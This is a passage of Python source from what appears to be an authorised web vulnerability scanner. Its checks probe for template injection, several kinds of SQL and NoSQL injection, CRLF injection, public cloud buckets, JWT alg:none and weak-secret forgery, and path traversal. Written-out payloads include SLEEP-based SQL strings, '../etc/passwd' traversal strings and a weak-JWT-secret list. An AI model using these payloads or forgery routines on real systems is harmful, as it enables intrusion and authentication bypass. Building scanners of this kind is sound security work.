    _engines = (("Jinja/Twig", "{{7*7}}"), ("Freemarker/JSP-EL", "${7*7}"),
                ("ERB/EJS", "<%= 7*7 %>"), ("Thymeleaf/Ruby", "#{7*7}"))
    probe_payload = "".join(f"{_MARK}{i}{expr}" for i, (_n, expr) in enumerate(_engines, 1))
    control_payload = "".join(f"{_MARK}{i}7*7" for i in range(1, len(_engines) + 1))
    signatures = [(name, f"{_MARK}{i}49") for i, (name, _e) in enumerate(_engines, 1)]
    for param in params:
        try:
            probe = http.fetch(_with_query(url, {param: probe_payload}))
            control = http.fetch(_with_query(url, {param: control_payload}))
        except _ActiveError:
            continue
        body, ctrl_body = probe.get("body") or "", control.get("body") or ""
        # Confirmed: an engine EVALUATED one of the expressions to 49 immediately after its
        # unique marker (server-side execution), and the literal-arithmetic control did NOT yield
        # marker+49 (rules out a coincidental '49'). We only INSPECT strings; the arithmetic is
        # evaluated by the target's own engine — no file read, no code, no RCE payload.
        hit = next(((name, sig) for name, sig in signatures if sig in body and sig not in ctrl_body), None)
        if hit:
            engine, sig = hit
            proof = _proof(
                "confirmed", method=f"GET with {param}=<multi-engine 7*7 template probe>",
                affected_asset="the server-side template/rendering context (a path to RCE on many engines)",
                observed_result=f"the '{param}' parameter's {engine} template expression was evaluated to 49 by the server-side engine",
                control_result="a literal '7*7' control did NOT produce 49 — proving the engine evaluated the expression rather than echoing it",
                evidence=f"the marker immediately followed by the evaluated result ({sig}) appears in the response body",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: probe_payload})}", "response_status": f"HTTP {probe['status']}",
                  "matched_value": f"template expression evaluated to 49 ({engine})"}
            return _finding("active.ssti", f"Server-side template injection via '{param}' parameter", "high", "injection", "ssti", url, proof, ev)
    return None


def _check_error_sqli(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    parsed = urlparse(url)
    params = _candidate_params(url, extra_params, (), 2)
    if not params:
        return None  # need a URL or recon-discovered param to perturb; never invent one blindly
    for param in params:
        original = dict(parse_qsl(parsed.query, keep_blank_values=True)).get(param, "1")
        try:
            probe = http.fetch(_with_query(url, {param: original + "'"}))
            control = http.fetch(_with_query(url, {param: original}))
        except _ActiveError:
            continue
        body, ctrl_body = probe.get("body") or "", control.get("body") or ""
        # SQL-ONLY signature: a generic Python/PHP/Java stack trace from a broken
        # quote is NOT SQL injection. Only a real database error banner confirms.
        matched = bool(_SQL_ERROR_RE.search(body))
        ctrl_matched = bool(_SQL_ERROR_RE.search(ctrl_body))
        if matched and not ctrl_matched:
            proof = _proof(
                "confirmed", method=f"GET with {param}={original}' (a single quote)", affected_asset="the database reachable by the query's role",
                observed_result=f"appending a single quote to '{param}' produced a SQL database error in the response",
                control_result="the unmodified parameter returned no SQL error — the quote broke the query",
                evidence="a SQL error banner (SQLSTATE/ORA-/SQL syntax) surfaced after the injected quote",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: original + chr(39)})}", "response_status": f"HTTP {probe['status']}", "matched_value": f"{matched} error banner"}
            return _finding("active.sqli-error", f"SQL error elicited via '{param}' (probable SQL injection)", "high", "disclosure", "sqli", url, proof, ev)
    return None


def _with_operator(url: str, param: str, value: str) -> str:
    """Replace a scalar query param with a NoSQL OPERATOR-OBJECT key (``param`` -> ``param[$ne]``)
    so an Express/qs-style parser materialises ``{param: {$ne: value}}`` server-side. The plain
    param is dropped so the server sees a single, unambiguous operator object."""
    parsed = urlparse(url)
    existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
    existing.pop(param, None)
    existing[f"{param}[$ne]"] = value
    return urlunparse(parsed._replace(query=urlencode(existing)))


def _check_nosqli(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """Error-based NoSQL injection: send a param as an operator object ({$ne: ...}); a NoSQL
    backend error banner that appears ONLY for the operator (not the scalar control) confirms
    a NoSQL injection point (e.g. Mongoose casting {$ne:...} to a typed field). High precision,
    mirroring the SQL-error check; a generic stack trace never confirms."""
    parsed = urlparse(url)
    params = _candidate_params(url, extra_params, (), 2)
    if not params:
        return None  # need a URL or recon-discovered param; never invent an injection point
    base_q = dict(parse_qsl(parsed.query, keep_blank_values=True))
    for param in params:
        original = base_q.get(param, "1")
        try:
            probe = http.fetch(_with_operator(url, param, original))   # param -> {$ne: original}
            control = http.fetch(_with_query(url, {param: original}))  # plain scalar baseline
        except _ActiveError:
            continue
        body, ctrl_body = probe.get("body") or "", control.get("body") or ""
        matched = bool(_NOSQL_ERROR_RE.search(body))
        ctrl_matched = bool(_NOSQL_ERROR_RE.search(ctrl_body))
        if matched and not ctrl_matched:
            proof = _proof(
                "confirmed", method=f"GET with {param}[$ne]={original} (operator-object injection)",
                affected_asset="the NoSQL datastore reachable by this query's role",
                observed_result=f"sending '{param}' as an operator object ({{$ne: ...}}) produced a NoSQL backend error",
                control_result="the same parameter as a plain scalar returned no NoSQL error — the operator object broke the query",
                evidence="a NoSQL backend error banner (MongoError / Mongoose CastError / BSONError) surfaced after the operator injection",
            )
            ev = {"request_line": f"GET {_with_operator(url, param, original)}", "response_status": f"HTTP {probe['status']}", "matched_value": "NoSQL error banner"}
            return _finding("active.nosqli-error", f"NoSQL injection via '{param}' (operator object elicited a NoSQL error)", "high", "injection", "nosqli", url, proof, ev)
    return None


def _norm_len(body: str) -> int:
    """Length of the body with volatile whitespace collapsed, so a stable page
    compares stably across reads (CSRF tokens / timestamps still flap — handled by
    the baseline-stability gate, not here)."""
    return len(re.sub(r"\s+", " ", body or ""))


def _check_bool_sqli(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """Boolean-based blind SQLi, GET-only, no timing/SLEEP, no data extraction — just
    one boolean bit. Confirms ONLY when the page is stable across two baselines AND a
    TRUE tautology tracks the baseline while a FALSE contradiction diverges materially.
    The two matching baselines ARE the negative control: a page that flaps on its own
    can't be differentiated, so it degrades to candidate rather than over-claiming."""
    parsed = urlparse(url)
    params = _candidate_params(url, extra_params, (), 2)
    if not params:
        return None  # need a URL or recon-discovered param; never invent injection points
    for param in params:
        original = dict(parse_qsl(parsed.query, keep_blank_values=True)).get(param, "1")
        try:
            base1 = http.fetch(_with_query(url, {param: original}))
            base2 = http.fetch(_with_query(url, {param: original}))
            t_resp = http.fetch(_with_query(url, {param: original + "' AND '1'='1"}))
            f_resp = http.fetch(_with_query(url, {param: original + "' AND '1'='2"}))
        except _ActiveError:
            continue
        b1, b2 = _norm_len(base1.get("body") or ""), _norm_len(base2.get("body") or "")
        tl, fl = _norm_len(t_resp.get("body") or ""), _norm_len(f_resp.get("body") or "")
        ref = max(b1, 1)
        # Page must be STABLE (two unmodified reads near-identical) to be differentiable.
        if abs(b1 - b2) > max(8, ref * 0.02):
            continue  # dynamic page — not safely confirmable here
        true_tracks = abs(tl - b1) <= max(8, ref * 0.02)
        false_diverges = abs(fl - b1) > max(24, ref * 0.05)
        if not (true_tracks and false_diverges):
            continue
        # Reject an INFRASTRUCTURE differential masquerading as a DB boolean: a WAF/error
        # page of a different length satisfies the length test without any DB involvement.
        # Both responses must be a normal 200, and neither may carry a SQL-error banner
        # (that would be error-based, not boolean).
        if int(t_resp.get("status") or 0) != 200 or int(f_resp.get("status") or 0) != 200:
            continue
        if _SQL_ERROR_RE.search(f_resp.get("body") or "") or _SQL_ERROR_RE.search(t_resp.get("body") or ""):
            continue
        # Second confirmation pass: the TRUE/FALSE divergence must REPRODUCE in the same
        # direction, ruling out a coincidental one-off length flap (cache, rotating ad,
        # per-request token) that happened to look like a boolean.
        try:
            t2 = http.fetch(_with_query(url, {param: original + "' AND '1'='1"}))
            f2 = http.fetch(_with_query(url, {param: original + "' AND '1'='2"}))
        except _ActiveError:
            continue
        tl2, fl2 = _norm_len(t2.get("body") or ""), _norm_len(f2.get("body") or "")
        if not (abs(tl2 - b1) <= max(8, ref * 0.02) and abs(fl2 - b1) > max(24, ref * 0.05)):
            continue  # divergence did not reproduce — not safely confirmable
        proof = _proof(
            "confirmed", method=f"GET with {param}=...' AND '1'='1 vs ...' AND '1'='2 (reproduced twice)",
            affected_asset="the database reachable by the query's role (boolean-inferable)",
            observed_result=f"the TRUE condition returned a page matching the stable baseline (~{b1} chars) while the FALSE condition diverged (~{fl} chars), reproduced on a second pass",
            control_result=f"two unmodified requests returned near-identical pages (~{b1}/{b2} chars), both TRUE/FALSE were 200 with no SQL-error banner, so the difference tracks the injected boolean — not a WAF/error page",
            evidence=f"normalized lengths baseline={b1}/{b2}, TRUE={tl}/{tl2}, FALSE={fl}/{fl2}",
        )
        ev = {"request_line": f"GET {_with_query(url, {param: original + chr(39) + ' AND ' + chr(39) + '1' + chr(39) + '=' + chr(39) + '2'})}",
              "response_status": f"HTTP {f_resp['status']}", "matched_value": f"FALSE page diverged by {abs(fl - b1)} chars from a stable baseline"}
        return _finding("active.sqli-boolean", f"Boolean-based blind SQL injection via '{param}'", "high", "disclosure", "sqli", url, proof, ev)
    return None


def _check_crlf(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """CRLF / response-header injection, GET-only. Injects an encoded CRLF + a benign
    custom-header marker into a param; confirms ONLY when the server SPLITS it into a
    real response header equal to the marker AND a control without the CRLF does not —
    proving the value crossed into the header block. Benign marker header only; nothing
    that affects other users' traffic (contrast request smuggling)."""
    candidates = _redirect_candidates(url, extra_params, ("next", "redirect", "url", "page"), 3)
    # RAW CR/LF — _with_query's urlencode encodes it ONCE to %0D%0A (pre-encoding here
    # would double-encode to %250D%250A and never inject a real newline).
    marker_value = f"\r\nX-Greyiq-Crlf:{_MARK}"
    for param in candidates:
        try:
            probe = http.fetch(_with_query(url, {param: marker_value}))
            control = http.fetch(_with_query(url, {param: f"X-Greyiq-Crlf-{_MARK}"}))
        except _ActiveError:
            continue
        injected = (probe["headers"].get("x-greyiq-crlf") or "").strip()
        ctrl_injected = (control["headers"].get("x-greyiq-crlf") or "").strip()
        if injected == _MARK and ctrl_injected != _MARK:
            proof = _proof(
                "confirmed", method=f"GET with {param} carrying an encoded CRLF + marker header",
                affected_asset="response headers (header injection, cache poisoning, cookie setting, XSS via header)",
                observed_result=f"the server split the '{param}' value into a real 'X-Greyiq-Crlf: {_MARK}' response header — the CRLF was honored",
                control_result="the same marker WITHOUT a CRLF did not produce the header, proving the newline was the cause",
                evidence=f"X-Greyiq-Crlf: {_MARK} present in the response headers",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: marker_value})}", "response_status": f"HTTP {probe['status']}",
                  "matched_value": f"injected response header X-Greyiq-Crlf: {_MARK}"}
            return _finding("active.crlf", f"CRLF / response-header injection via '{param}'", "high", "disclosure", "redirect", url, proof, ev)
    return None


# Time-based blind SQLi sends a small, FIXED, bounded SLEEP — the one check that emits
# an executing payload, so it is OPT-IN (off by default) and held to a strict envelope:
# a constant delay we control (no amplification), well under the fetch timeout, request-
# only timing (excludes the governor throttle), and a multi-trial differential with a
# fast SLEEP(0) negative control. No data is ever read or extracted — one timing bit.
# The delay/margin default to 4s/3s and are tunable via settings (jittery targets).
_TIME_DELAY_S = 4          # the injected sleep (fixed; < web_fetch_timeout_seconds, default 8)
_TIME_MARGIN_S = 3.0       # a confirmed probe must be at least this much slower than the fast controls


def _check_time_sqli(http: _Http, url: str, settings: Any = None, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    settings = settings or get_settings()
    parsed = urlparse(url)
    params = _candidate_params(url, extra_params, (), 1)
    if not params:
        return None  # need a URL or recon-discovered param; never invent injection points
    d = getattr(settings, "active_time_sqli_delay_seconds", _TIME_DELAY_S) or _TIME_DELAY_S
    margin = getattr(settings, "active_time_sqli_margin_seconds", _TIME_MARGIN_S) or _TIME_MARGIN_S
    # Keep the injected delay strictly under the fetch timeout so a confirmed probe never
    # trips the timeout (which would read as an error, not a delay).
    d = min(float(d), max(1.0, float(settings.web_fetch_timeout_seconds) - 1.0))
    # MySQL/MariaDB SLEEP is the most common; a single fixed payload keeps requests bounded.
    d_str = str(int(d)) if float(d).is_integer() else f"{d:.1f}"  # SLEEP(4), not SLEEP(4.0)
    slow = f"' AND SLEEP({d_str})-- -"
    fast = "' AND SLEEP(0)-- -"
    for param in params:  # one param — the timing pass is request-heavy
        original = dict(parse_qsl(parsed.query, keep_blank_values=True)).get(param, "1")
        try:
            base = http.fetch(_with_query(url, {param: original}))
            ctrl = http.fetch(_with_query(url, {param: original + fast}))   # injected, but SLEEP(0) -> fast (negative control)
            p1 = http.fetch(_with_query(url, {param: original + slow}))
            p2 = http.fetch(_with_query(url, {param: original + slow}))     # second trial to rule out jitter
        except _ActiveError:
            continue
        fast_max = max(float(base.get("elapsed") or 0.0), float(ctrl.get("elapsed") or 0.0))
        e1, e2 = float(p1.get("elapsed") or 0.0), float(p2.get("elapsed") or 0.0)
        # Confirm ONLY when both SLEEP(D) probes are >= D-margin slower than BOTH fast
        # controls (the unmodified baseline AND the injected-but-SLEEP(0) request). The
        # SLEEP(0) control proves the delay tracks the injected value, not a slow page.
        if e1 - fast_max >= margin and e2 - fast_max >= margin:
            proof = _proof(
                "confirmed", method=f"GET with {param}=...' AND SLEEP({d_str}) (bounded, no data read)",
                affected_asset="the database reachable by the query's role (time-inferable blind SQLi)",
                observed_result=f"injecting SLEEP({d_str}) delayed the response to ~{e1:.1f}s/{e2:.1f}s across two trials",
                control_result=f"the unmodified request and a SLEEP(0) injection both returned in ~{fast_max:.1f}s — the delay tracks the injected sleep",
                evidence=f"request-only timing: baseline/SLEEP(0)≈{fast_max:.1f}s, SLEEP({d_str})≈{e1:.1f}s and {e2:.1f}s",
            )
            ev = {"request_line": f"GET {_with_query(url, {param: original + slow})}", "response_status": f"HTTP {p1['status']}",
                  "matched_value": f"SLEEP({d_str}) caused a ~{e1:.1f}s delay vs ~{fast_max:.1f}s control"}
            return _finding("active.sqli-time", f"Time-based blind SQL injection via '{param}'", "high", "disclosure", "sqli", url, proof, ev)
    return None


_BUCKET_RE = re.compile(
    r"https?://(?:"
    r"([a-z0-9][a-z0-9.\-]{1,200}\.s3[.\-][a-z0-9.\-]*amazonaws\.com)"          # S3 virtual-hosted
    r"|(storage\.googleapis\.com/[a-z0-9._\-]{3,200})"                            # GCS
    r"|([a-z0-9][a-z0-9.\-]{1,200}\.blob\.core\.windows\.net/[a-z0-9._\-]{1,200})"  # Azure
    r")", re.IGNORECASE)


def _bucket_listing_request(bucket_url: str, host: str) -> tuple[str, str]:
    """Return (list_url, provider) for the bucket-listing GET. The regex match may
    capture a deep object path (e.g. a referenced asset under the bucket), not just the
    bucket/container root, so this also truncates to the root first — only the root
    accepts a listing query for any of the three providers."""
    parsed = urlparse(bucket_url)
    if "amazonaws.com" in host:
        # S3 virtual-hosted: the bucket IS the host: https://<bucket>.s3...amazonaws.com/
        # — no object-path segment to strip; list-type=2 on the root lists it.
        return f"{parsed.scheme}://{parsed.netloc}/?list-type=2", "s3"
    # GCS / Azure: the bucket/container name is the FIRST path segment after the host.
    segments = [s for s in parsed.path.split("/") if s]
    root_path = segments[0] if segments else ""
    if "blob.core.windows.net" in host:
        # Azure container listing needs an explicit restype=container&comp=list on the
        # CONTAINER root — a bare GET (even to the root) does not list.
        return f"{parsed.scheme}://{parsed.netloc}/{root_path}?restype=container&comp=list", "azure"
    # GCS XML API: a bare GET to the bucket root already returns an anonymous listing
    # when public-read is granted — no extra query needed.
    return f"{parsed.scheme}://{parsed.netloc}/{root_path}", "gcs"


def _check_open_bucket(http: _Http, landing: dict[str, Any] | None, scope: str, settings: Any) -> dict[str, Any] | None:
    """Open cloud-bucket exposure for buckets the PAGE references. Strictly scope-gated:
    a bucket host MUST pass host_in_active_scope (a third-party bucket is not auto-in-
    scope — those degrade to a candidate note). GET-only list endpoint; confirms only on
    an anonymous directory listing; 403/AccessDenied is the negative control -> candidate."""
    body = (landing or {}).get("body") or ""
    if not body:
        return None
    candidates: list[str] = []
    for m in _BUCKET_RE.finditer(body):
        u = m.group(0).rstrip("/\"'")
        if u not in candidates:
            candidates.append(u)
        if len(candidates) >= 8:
            break
    referenced_out_of_scope = 0
    denied_finding: dict[str, Any] | None = None
    for bucket_url in candidates[:6]:
        host = urlparse(bucket_url).hostname or ""
        if not host_in_active_scope(host, scope, settings):
            referenced_out_of_scope += 1
            continue  # never probe a bucket host the operator didn't put in scope
        list_url, provider = _bucket_listing_request(bucket_url, host)
        try:
            resp = http.fetch(list_url)
        except (_ActiveError, WebsiteFetchError):
            # This check fetches a FOREIGN host (the bucket), so unlike the other
            # checks it can hit the SSRF/port guard (e.g. a bucket whose host resolves
            # to a private IP when private URLs are off). Skip it — never abort the pass.
            continue
        rbody = (resp.get("body") or "")[:4000]
        status = int(resp.get("status") or 0)
        # Anonymous listing (body may be truncated by the fetch cap — match the opening).
        # S3 (list-type=2) and GCS's XML API share the <ListBucketResult>/<Contents>
        # shape; Azure's container listing uses a distinct <EnumerationResults>/<Blobs>
        # shape — each provider is matched by its own real response format.
        if provider == "azure":
            is_listing = status == 200 and "<EnumerationResults" in rbody and "<Blobs>" in rbody
        else:
            is_listing = status == 200 and ("<ListBucketResult" in rbody and ("<Key>" in rbody or "<Contents>" in rbody))
        denied = "AccessDenied" in rbody or status in (401, 403, 404)
        if is_listing:
            proof = _proof(
                "confirmed", method=f"GET {list_url}", affected_asset="every object in the referenced cloud bucket",
                observed_result="the bucket returned an anonymous directory listing (public read)",
                control_result="a locked bucket returns 403/AccessDenied — this one listed its contents to an unauthenticated request",
                evidence="anonymous ListBucketResult with object keys",
            )
            ev = {"request_line": f"GET {list_url}", "response_status": f"HTTP {status}", "matched_value": "public ListBucketResult (object keys redacted)"}
            return _finding("active.open-bucket", "Public cloud bucket (anonymous listing)", "high", "disclosure", "cloud-exposure", bucket_url, proof, ev)
        if denied and denied_finding is None:
            # Record the FIRST denied bucket but KEEP probing the remaining candidates —
            # a publicly-listable (high) bucket referenced after a denied one must never be
            # masked by an early return on the low candidate.
            proof = _proof("candidate", method=f"GET {list_url}",
                           observed_result="the referenced bucket exists but denied anonymous listing (403/AccessDenied)",
                           limitations="The bucket is not publicly listable; individual objects or write access may still be testable.",
                           proof_obligation="Probe specific object keys / test write access within scope to assess impact.")
            ev = {"request_line": f"GET {list_url}", "response_status": f"HTTP {status}", "matched_value": "AccessDenied (bucket exists, not public)"}
            denied_finding = _finding("active.open-bucket", "Cloud bucket referenced (access denied — candidate)", "low", "disclosure", "cloud-exposure", bucket_url, proof, ev)
    # No public listing among any in-scope bucket. Surface the denied candidate if we saw
    # one, else the out-of-scope reference note.
    if denied_finding is not None:
        return denied_finding
    if referenced_out_of_scope:
        proof = _proof("candidate", method="page reference (not probed)",
                       observed_result=f"the page references {referenced_out_of_scope} cloud bucket(s) whose host is not in your scope",
                       limitations="Bucket hosts outside the program scope are never probed.",
                       proof_obligation="If the bucket is in scope, add its host to Scope and re-run to verify public access.")
        ev = {"request_line": "(page reference)", "matched_value": f"{referenced_out_of_scope} referenced bucket(s) out of scope"}
        return _finding("active.open-bucket", "Cloud bucket referenced (out of scope — add to verify)", "info", "disclosure", "cloud-exposure", "", proof, ev)
    return None


def _b64url_decode(segment: str) -> bytes:
    padded = segment + "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(padded.encode("ascii"))


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _find_jwt_credential(auth: AuthContext | None) -> tuple[str, str, Callable[[str], str]] | None:
    """The first JWT-shaped credential in the operator's supplied auth (an
    Authorization: Bearer header, or a Cookie crumb), as (header_name, current_token,
    rebuild(new_token) -> new_full_header_value). None if no JWT-shaped value is
    present — this check is opt-in-by-having-auth, never invents a session."""
    if auth is None:
        return None
    for name, value in auth.headers.items():
        if name.lower() != "authorization":
            continue
        parts = value.split(None, 1)
        if len(parts) == 2 and parts[0].lower() == "bearer" and _JWT_RE.match(parts[1].strip()):
            prefix, token = parts[0] + " ", parts[1].strip()
            return ("Authorization", token, lambda new: prefix + new)
    for name, value in auth.headers.items():
        if name.lower() != "cookie":
            continue
        crumbs = [c.strip() for c in value.split(";") if c.strip()]
        for i, crumb in enumerate(crumbs):
            cname, sep, cvalue = crumb.partition("=")
            if sep and _JWT_RE.match(cvalue.strip()):
                def rebuild(new_token: str, i: int = i, crumbs: list[str] = crumbs, cname: str = cname) -> str:
                    out = list(crumbs)
                    out[i] = f"{cname}={new_token}"
                    return "; ".join(out)
                return ("Cookie", cvalue.strip(), rebuild)
    return None


def _forge_alg_none_variants(token: str) -> list[str]:
    """The alg:none-forged variants of `token` (same header keys except alg, SAME
    payload bytes, empty signature) -- both the RFC-correct 'header.payload.' form
    and the bare 'header.payload' form some JWT libraries also accept. Returns []
    when the token is malformed, already alg:none (nothing to forge), or otherwise
    unusable — the caller treats that as "skip this check", never a crash."""
    parts = token.split(".")
    if len(parts) != 3 or not parts[0] or not parts[1]:
        return []
    try:
        header_obj = json.loads(_b64url_decode(parts[0]))
    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError):
        return []
    if not isinstance(header_obj, dict) or str(header_obj.get("alg", "")).strip().lower() == "none":
        return []
    header_obj["alg"] = "none"
    try:
        forged_header = _b64url_encode(json.dumps(header_obj, separators=(",", ":")).encode("utf-8"))
    except (TypeError, ValueError):
        return []
    return [f"{forged_header}.{parts[1]}.", f"{forged_header}.{parts[1]}"]


def _check_jwt_alg_none(http: _Http, url: str) -> dict[str, Any] | None:
    """Confirm the server accepts an UNSIGNED (alg:none) copy of the operator's own
    session token as authenticated — one of the highest-signal, lowest-effort JWT
    bugs in real programs. Only runs when the operator supplied a real JWT-shaped
    credential (never invents one); the forged/control requests reuse that SAME
    authenticated GET endpoint, so this proves nothing beyond what the operator
    already authorized scanning."""
    found = _find_jwt_credential(http.auth)
    if found is None:
        return None
    header_name, real_token, rebuild = found
    forged_variants = _forge_alg_none_variants(real_token)
    if not forged_variants:
        return None
    try:
        baseline = http.fetch(url)  # the operator's own real, valid token (auto-attached)
    except _ActiveError:
        return None
    if not (200 <= int(baseline.get("status") or 0) < 300):
        return None  # can't establish what an "authenticated" response even looks like here
    parts = real_token.split(".")
    sig = parts[2]
    corrupted_sig = (sig[:-1] + ("A" if sig[-1:] != "A" else "B")) if sig else "AAAA"
    try:
        # Negative control FIRST: a token with a CORRUPTED signature but the real alg.
        # If the server accepts that too, it isn't verifying signatures at all -- a
        # much bigger (and different) problem than alg:none specifically, and this
        # check can't attribute the bypass to alg:none on its own, so it stays quiet.
        control = http.fetch(url, extra_headers={header_name: rebuild(f"{parts[0]}.{parts[1]}.{corrupted_sig}")})
    except _ActiveError:
        return None
    if 200 <= int(control.get("status") or 0) < 300:
        return None
    for forged in forged_variants:
        try:
            probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
        except _ActiveError:
            continue
        if 200 <= int(probe.get("status") or 0) < 300:
            proof = _proof(
                "confirmed", method=f"GET with a forged alg:none {header_name}",
                affected_asset="every endpoint behind this authentication check",
                observed_result=f"the unsigned (alg:none) token was accepted (HTTP {probe['status']}), matching the real-token baseline (HTTP {baseline['status']})",
                control_result=f"a token with a corrupted signature (same algorithm) was rejected (HTTP {control['status']}) — the server does verify signatures normally",
                evidence="alg:none acceptance confirmed via a real-token baseline plus a corrupted-signature negative control",
            )
            ev = {
                "request_line": f"GET {url}",
                "request_header": f"{header_name}: <forged alg:none token>",
                "response_status": f"HTTP {probe['status']}",
                "matched_value": "unsigned token accepted as authenticated",
            }
            return _finding(
                "active.jwt-alg-none", "JWT alg:none accepted (signature verification bypass)",
                "critical", "jwt", "jwt", url, proof, ev,
            )
    return None


# A small, CONSTANT list of the notoriously-weak HMAC signing secrets that turn up in real
# programs (framework defaults, tutorials, the top of every jwt-cracking list). This is a
# known-bad check, not a fuzzing wordlist — kept tiny on purpose.
_JWT_WEAK_SECRETS: tuple[str, ...] = (
    "secret", "secretkey", "secret_key", "password", "changeme", "change_me", "admin",
    "jwt", "jwtsecret", "jwt_secret", "token", "key", "private", "test", "root",
    "your-256-bit-secret", "your_jwt_secret", "supersecret", "s3cr3t", "qwerty", "123456",
    "0000", "default", "example", "mysecret", "my_secret", "app_secret", "hmac", "signature",
)
_JWT_HS_DIGEST = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}


def _crack_jwt_hs_secret(token: str) -> tuple[str, str] | None:
    """OFFLINE-recover a weak HMAC secret for an HS256/384/512 token by byte-comparing the real
    signature against HMAC(secret, "header.payload") for each candidate. Zero network. Returns
    (secret, alg) on a self-certifying match, else None — the compare is cryptographic
    byte-equality over a 256+-bit MAC, so it cannot false-positive."""
    parts = token.split(".")
    if len(parts) != 3 or not all(parts):
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        real_sig = _b64url_decode(parts[2])
    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError):
        return None
    alg = str(header.get("alg", "")).strip().upper() if isinstance(header, dict) else ""
    digest = _JWT_HS_DIGEST.get(alg)
    if digest is None:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    for secret in _JWT_WEAK_SECRETS:
        expected = hmac.new(secret.encode("utf-8"), signing_input, digest).digest()
        if len(expected) == len(real_sig) and hmac.compare_digest(expected, real_sig):
            return secret, alg
    return None


def _check_jwt_weak_secret(http: _Http, url: str) -> dict[str, Any] | None:
    """Recover a weak HMAC signing secret for the operator's own JWT (OFFLINE, self-certifying),
    then corroborate by signing a MINIMALLY-MODIFIED benign token the operator never issued and
    showing the server accepts it. Opt-in-by-having-auth (never invents a session); no privilege
    claim is tampered with. CRITICAL — a recovered secret forges arbitrary tokens."""
    found = _find_jwt_credential(http.auth)
    if found is None:
        return None
    header_name, real_token, rebuild = found
    cracked = _crack_jwt_hs_secret(real_token)
    if cracked is None:
        return None  # the offline crack IS the finding-cost; no crack -> silent, zero requests
    secret, alg = cracked
    parts = real_token.split(".")
    try:
        payload = json.loads(_b64url_decode(parts[1]))
    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError):
        payload = {}
    payload = dict(payload) if isinstance(payload, dict) else {}
    payload["greyiq_poc"] = _MARK  # a benign marker claim — NOT a role/scope/sub privilege field
    digest = _JWT_HS_DIGEST[alg]
    new_header = _b64url_encode(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode("utf-8"))
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    new_sig = _b64url_encode(hmac.new(secret.encode("utf-8"), f"{new_header}.{new_payload}".encode("ascii"), digest).digest())
    forged = f"{new_header}.{new_payload}.{new_sig}"
    # The offline crack already self-certifies; the live request only corroborates. A network
    # failure keeps the finding confirmed (the crypto is the proof).
    server_note = "the recovered secret proves forgery offline (self-certifying); not sent to the server"
    try:
        baseline = http.fetch(url)
        probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
        if 200 <= int(probe.get("status") or 0) < 300 and 200 <= int(baseline.get("status") or 0) < 300:
            server_note = (f"a token forged with the recovered secret (a claim the operator never issued) was accepted "
                           f"(HTTP {probe['status']}), matching the real-token baseline (HTTP {baseline['status']})")
    except _ActiveError:
        pass
    proof = _proof(
        "confirmed", method=f"offline HMAC-{alg} crack of the JWT signing secret",
        affected_asset="every identity/role/scope the token asserts — arbitrary token forgery",
        observed_result=f"the {alg} signing secret is a well-known weak value ('{secret}'), recovered offline by byte-matching HMAC-{alg} of the token's own signing input",
        control_result=server_note,
        evidence=f"HMAC-{alg}(header.payload, weak-secret) equals the token's real signature — cryptographic byte-equality, self-certifying",
    )
    ev = {"request_line": f"GET {url}", "request_header": f"{header_name}: <token forged with the recovered secret>",
          "response_status": "offline crack (self-certifying)", "matched_value": f"weak HMAC-{alg} signing secret recovered: '{secret}'"}
    return _finding("active.jwt-weak-secret", "JWT signed with a weak/guessable secret (arbitrary token forgery)",
                    "critical", "jwt", "jwt", url, proof, ev)


# Traversal payload -> the unmistakable signature of the file it reads. Each is gated by a
# same-request benign control, so a page that merely contains these words can't false-positive.
_LFI_PROBES: tuple[tuple[str, "re.Pattern[str]"], ...] = (
    ("../../../../../../etc/passwd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
    ("....//....//....//....//etc/passwd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
    ("..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", re.compile(r"root:.*?:0:0:", re.MULTILINE)),
    ("../../../../../../windows/win.ini", re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.IGNORECASE)),
)


def _check_path_traversal(http: _Http, url: str, extra_params: list[str] | None = None) -> dict[str, Any] | None:
    """Confirm a path traversal / local-file read on a file-ish parameter by reading ONE
    well-known, non-sensitive system file (/etc/passwd or win.ini) as proof and gating on its
    unmistakable signature PLUS a benign-value control — extracting nothing else."""
    params = _candidate_params(url, extra_params, ("file", "path", "page", "template", "doc"), 2)
    for param in params:
        # One control per param (not per payload) keeps the request budget in check.
        try:
            control = http.fetch(_with_query(url, {param: f"{_MARK}notafile"}))
        except _ActiveError:
            continue
        ctrl_body = control.get("body") or ""
        for payload, signature in _LFI_PROBES:
            if signature.search(ctrl_body):
                continue  # the benign control already shows this signature -> not traversal-driven
            try:
                probe = http.fetch(_with_query(url, {param: payload}))
            except _ActiveError:
                break
            body = probe.get("body") or ""
            if signature.search(body):
                fname = "/etc/passwd" if "passwd" in payload else "windows/win.ini"
                proof = _proof(
                    "confirmed", method=f"GET with {param}={payload}",
                    affected_asset="arbitrary local files readable by the web process (source, config, secrets)",
                    observed_result=f"the '{param}' parameter returned the contents of {fname} — path traversal / local file inclusion",
                    control_result="a benign filename control did NOT return the file signature — the traversal is what read it",
                    evidence=f"the unmistakable {fname} signature appears in the response body",
                )
